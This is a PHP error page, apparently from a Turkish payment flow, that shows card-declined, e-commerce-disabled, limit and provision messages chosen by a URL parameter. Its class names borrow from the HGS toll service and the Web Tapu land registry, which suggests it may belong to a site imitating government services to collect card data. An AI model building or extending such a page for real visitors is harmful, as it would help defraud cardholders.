<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
$aktif_adim = 3;

$hata_kodu = $_GET['hata'] ?? 'kart_hatali';
$mesajlar = [
  'kart_hatali'           => ['Kart Bilgileri Hatalı',          'Girdiğiniz kart bilgileri doğrulanamadı. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.'],
  'eticaret_kapali'       => ['E-Ticarete Kapalı',              'Kartınız e-ticaret işlemlerine kapalıdır. Bankanızı arayarak e-ticaret limitinizi açtırınız.'],
  'limit_yetersiz'        => ['Kart Limiti Yetersiz',           'Kartınızda yeterli limit bulunmamaktadır. Limiti yeterli başka bir kartla tekrar deneyiniz.'],
  'kart_desteklenmiyor'   => ['Kart Desteklenmiyor',            'Kullandığınız kart türü bu işlem için desteklenmemektedir. Lütfen farklı bir kart deneyiniz.'],
  'provizyon_gonder'      => ['Provizyon Hatası',               'İşleminiz sırasında bir hata oluştu. Lütfen tekrar deneyiniz.'],
  'provizyon_hatali'      => ['Provizyon Onaylanamadı',         'Ödeme provizyon aşamasında hata oluştu. Bankanız işlemi onaylamadı.'],
];
[$baslik, $aciklama] = $mesajlar[$hata_kodu] ?? ['İşlem Hatası', 'Bir hata oluştu. Lütfen tekrar deneyiniz.'];

require_once __DIR__ . '/includes/header.php';
?>
        <section class="hgs-card" style="text-align:center;padding:50px 24px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);max-width:550px;margin:40px auto">
          <div style="width:80px;height:80px;background:#e74c3c;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 15px rgba(231,76,60,0.3)">
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </div>
          <h3 style="font-size:24px;color:#2c3e50;margin-bottom:12px;font-weight:700"><?= htmlspecialchars($baslik) ?></h3>
          <p style="font-size:15px;color:#7f8c8d;max-width:400px;margin:0 auto 28px;line-height:1.6">
            <?= htmlspecialchars($aciklama) ?>
          </p>
          
          <div class="webtapu-actions webtapu-actions--column" style="display:flex;flex-direction:column;gap:12px;max-width:320px;margin:0 auto">
            <a href="<?= BASE_PATH ?>/odeme.php" class="primaryButton" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;padding:14px 32px;background:#f39c12;color:#fff;font-weight:600;font-size:15px;border:none;cursor:pointer">
              Tekrar Dene
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
            </a>
            <a href="<?= BASE_PATH ?>/" class="secondaryButton" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;padding:12px 32px;background:#f8f9fa;color:#7f8c8d;border:1px solid #ddd;font-weight:600;font-size:15px">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
              Ana Sayfaya Dön
            </a>
          </div>
        </section>
<?php require_once __DIR__ . '/includes/footer.php'; ?>
